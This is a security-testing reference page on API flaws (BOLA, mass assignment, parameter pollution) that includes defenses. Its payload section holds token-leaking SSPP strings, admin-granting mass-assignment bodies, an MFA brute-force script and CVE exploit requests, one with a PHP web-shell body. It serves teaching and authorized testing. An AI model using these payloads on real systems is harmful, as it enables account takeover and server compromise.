# API Testing & Security

> Testing REST/RPC APIs for auth, BOLA, mass assignment, and excessive data exposure. **Deep dive:** [`Troubleshooting_Guide/api_testing.md`](../../../../Troubleshooting_Guide/api_testing.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** OWASP API Top 10
**Status:** complete

## What it is
API security covers the flaws specific to machine-to-machine interfaces — REST, RPC, and GraphQL
endpoints that expose business logic directly. The dominant bugs are authorization failures
(BOLA/IDOR, broken function-level auth), mass assignment, excessive data exposure, and weak
controls on undocumented methods and versions.

## How it works
APIs trust the client far more than a rendered web app does: object IDs travel in the URL/body,
the full data model is often serialized back, and binding frameworks auto-map JSON keys onto
server-side objects. The attacker controls IDs, extra fields, HTTP methods, and parameter
duplicates; the app fails to check that *this* user may touch *that* object, blindly binds
attacker-supplied fields like `role`/`isAdmin`, or routes a polluted value into an internal
request (SSPP). Shadow endpoints, old API versions, and verbose error messages widen the gap.

## Impact
Horizontal and vertical privilege escalation (read/modify other users' objects, grant yourself
admin), account takeover (leaked reset tokens via SSPP, mass-assigned roles), financial
manipulation (zeroing price/shipping), and bulk data exfiltration when the API over-returns
fields. Severity ranges from medium to critical — BOLA and mass-assignment-to-admin are routinely
critical.

## How to detect
- Swap or increment object IDs and watch for another user's data instead of `403`.
- Add unexpected JSON fields (`role`, `isAdmin`, `balance`) and check whether they take effect.
- `OPTIONS` to read the `Allow` header; try `PATCH`/`PUT`/`DELETE` the docs never mention.
- URL-encode `&`, `#`, `?` into a reflected value and look for leaked tokens or changed behavior
  (SSPP); differential timing or response size confirms blind variants.
- Probe `/api/docs`, `/openapi.json`, `/swagger.json` and strip path segments to map the surface.

## Exploitation (summary)
Map the surface from docs/introspection and path truncation, then attack authorization first:
enumerate object IDs (BOLA) and call privileged functions as a low-priv user. Mass-assign hidden
fields on create/update endpoints. Smuggle parameters with SSPP/HPP — encode `%26field=...%23`
into a username to leak a reset token, or duplicate keys to bypass rate limits. Fall back to old
API versions that skip controls. Full payloads in the Payloads section and the deep-dive note.

## Payloads & techniques

> Distilled from field payload references — for authorized testing only.

### Server-Side Parameter Pollution (SSPP)

Inject extra parameters or truncate the back-end query by URL-encoding `&`, `#`, and `?` into a value the server reflects into an internal request.

```http
username=administrator%26x=y                 # inject &x=y
username=administrator%23                     # truncate query string with #
username=administrator%26field=email%23
username=administrator%26field=reset_token%23
username=administrator%26field=password%23
username=administrator%26field=passwordResetToken%23
```

Typical flow: POST to `/forgot-password` with `username=<target>%26field=<field>%23`, extract the leaked token (often 32-char hex) from the response, then reset the password and log in.

REST/path-based variant — truncate or traverse the internal path:

```http
username=administrator#                        # truncate path
username=administrator?                         # confirm path placement
username=./administrator                        # relative path (same)
username=../administrator                       # parent directory
username=../../../../#                           # find API root
username=../../../../openapi.json#
username=administrator/field/email#
username=administrator/field/passwordResetToken#
username=../../v1/users/administrator/field/passwordResetToken#
```

### API documentation & path discovery

```http
GET /api
GET /api/docs
GET /api/swagger
GET /api/swagger.json
GET /api/openapi.json
GET /api/v1
GET /swagger-ui
GET /graphql
```

Path-truncation recon — strip segments to reveal structure: `GET /api/user/wiener` → `GET /api/user` → `GET /api`. Wider doc path list:

```bash
/api  /api/v1  /api/v2  /api/v3
/api/docs  /api/swagger  /api/redoc
/swagger.json  /swagger.yaml  /openapi.json  /openapi.yaml
/graphql  /api/graphql
/.well-known/openapi.json
```

### Unused / hidden HTTP methods

```http
OPTIONS /api/products/3/price        # read Allow header for supported methods

PATCH /api/products/3/price
Content-Type: application/json
{"price": 0}

PUT /api/products/3/price
Content-Type: application/json
{"price": 0}

DELETE /api/user/carlos
```

### Mass assignment

Submit hidden privileged fields the client never sends. Common targets: `role`, `isAdmin`, `balance`, `credits`, `price`, `shipping_cost`, `tax_amount`, `chosen_discount`, `reset_token`, `api_key`.

```json
POST /api/checkout
{ "chosen_discount": {"percentage": 100},
  "chosen_products": [{"product_id": "1", "quantity": 1}] }
```

```json
POST /api/users/register
{ "username": "attacker", "password": "pass123",
  "email": "attacker@evil.com", "role": "admin", "isAdmin": true }
```

```json
POST /api/profile/update
{ "name": "John", "email": "john@example.com",
  "balance": 999999, "credits": 999999 }
```

```json
POST /api/orders
{ "items": [{"id": 1, "qty": 2}], "address": "123 Main St",
  "shipping_cost": 0, "tax_amount": 0, "is_premium": true }
```

Nested mass assignment hides the field one level deeper:

```json
POST /api/user/update
{ "profile": { "name": "John",
    "settings": { "notifications": true, "role": "admin" } } }
```

### Parameter pollution variants

HTTP Parameter Pollution (HPP) — the same key twice; which value wins is platform-specific:

```http
GET /api/transfer?amount=1&from=user1&to=attacker&amount=1000
# PHP/Apache: last value wins (1000)
# ASP.NET:    comma-joined (1,1000)
# JSP/Tomcat: first value (1)
```

JSON parameter pollution — duplicate key, parser keeps last:

```json
POST /api/checkout
{ "total": 10, "total": 0 }
```

Double-encoding bypass — survives one decode pass:

```http
username=admin%2526field%253Dtoken%2523
# -> admin%26field%3Dtoken%23 -> admin&field=token#
```

Blind SSPP (timing) — diff response times across field guesses:

```http
username=admin&field=email#
username=admin&field=password#
username=admin&field=api_key#
```

Rate-limit bypass — limiter keys on one param, backend reads another:

```http
POST /api/forgot-password
username=dummy&user=admin#
```

### GraphQL surface

```graphql
# introspection discovery
{ __schema { types { name fields { name type { name } } } } }
```

```graphql
mutation {
  updateUser(input: { name: "John", isAdmin: true, balance: 999999 }) {
    user { id name }
  }
}
```

### API version mixing

Older versions may skip controls the current one enforces.

```http
POST /api/users
X-API-Version: 1

POST /api/v1/users
POST /api/users?version=1
POST /api/users   {"api_version": "1", "data": {...}}
```

### Authentication: enumeration & 2FA brute force

Username enumeration via error-message differences (`Invalid username` vs. password error). Once a username is confirmed, brute-force its password. For a 4-digit MFA code, exhaust `0000`–`9999`, watching for a `302` to `/my-account`:

```http
POST /login2
csrf=<csrf>&mfa-code=0000
...
csrf=<csrf>&mfa-code=9999
```

```python
import requests
from bs4 import BeautifulSoup

URL = "https://target.web-security-academy.net"
s = requests.Session()

def login():
    r = s.get(f"{URL}/login")
    csrf = BeautifulSoup(r.text, "html.parser").find("input", {"name": "csrf"})["value"]
    s.post(f"{URL}/login", data={"csrf": csrf, "username": "carlos", "password": "montoya"})
    r = s.get(f"{URL}/login2")
    return BeautifulSoup(r.text, "html.parser").find("input", {"name": "csrf"})["value"]

for i in range(10000):
    if i % 2 == 0:
        csrf = login()
    r = s.post(f"{URL}/login2", data={"csrf": csrf, "mfa-code": str(i).zfill(4)}, allow_redirects=False)
    if r.status_code == 302 and "/my-account" in r.headers.get("Location", ""):
        print(f"Code found: {str(i).zfill(4)}")
        break
```

### Real-world CVEs

```http
# CVE-2024-21887 — Ivanti Connect Secure (SSPP auth bypass)
POST /api/v1/totp/user-backup-code/../../system/user/admin
```

```json
POST /app/rest/users        # CVE-2023-42793 — JetBrains TeamCity (mass assignment)
{ "username": "newuser", "password": "pass123", "roles": ["SYSTEM_ADMIN"] }
```

```http
# CVE-2024-4577 — PHP CGI argument injection
GET /index.php?-d+allow_url_include=1+-d+auto_prepend_file=php://input
# body: <?php system($_GET[cmd]); ?>
```

### URL-encoding reference

| Char | Encoded | Purpose |
|------|---------|---------|
| `&`  | `%26`   | inject additional parameter |
| `#`  | `%23`   | truncate URL / query string |
| `?`  | `%3F`   | start new query string |
| `.`  | `%2E`   | path traversal |
| `/`  | `%2F`   | path traversal |
| `\`  | `%5C`   | path traversal (Windows) |

## Defenses
1. **Enforce object-level authorization** on every endpoint — check the caller owns/may access the
   referenced ID server-side; never rely on the client to send only "its own" IDs.
2. **Enforce function-level authorization** — gate every method/route by role; default-deny.
3. **Allow-list bindable fields** (DTOs / explicit field mapping); never auto-bind whole request
   bodies onto domain objects, blocking mass assignment.
4. **Return only the fields the client needs** — no over-serialization of internal/sensitive fields.
5. Validate and canonicalize input before it enters internal requests (defeats SSPP/HPP); decide a
   deterministic policy for duplicate parameters.
6. Retire old API versions, remove undocumented methods, rate-limit and authenticate consistently
   across versions, and keep an accurate inventory of every exposed endpoint.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=API+Testing+&+Security
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=API+Testing+&+Security
- **Exploit-DB** — https://www.exploit-db.com/search?q=API+Testing+&+Security
- **GitHub Advisories** — https://github.com/advisories?query=API+Testing+&+Security
- **OSV** — https://osv.dev/list?q=API+Testing+&+Security
- **Community** — r/netsec, vendor security blogs, HackerOne Hacktivity, X/Twitter infosec.
- _Query tip: add the target product + version, e.g. `API Testing & Security <product> <version>`._

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- `CVE-2024-21887` — Ivanti Connect Secure command injection, chained with an auth-bypass via API
  path traversal (`../../system/...`); mass-exploited in early 2024.
- `CVE-2023-42793` — JetBrains TeamCity auth bypass on the REST API enabling admin token/account
  creation (mass assignment of roles).
- `CVE-2018-1000861` — Jenkins Stapler API method-invocation bug allowing unauthenticated access
  to internal methods.

## References
- PortSwigger Web Security Academy — API testing.
- OWASP API Security Top 10 (2023).
- OWASP REST Security Cheat Sheet & Mass Assignment Cheat Sheet.
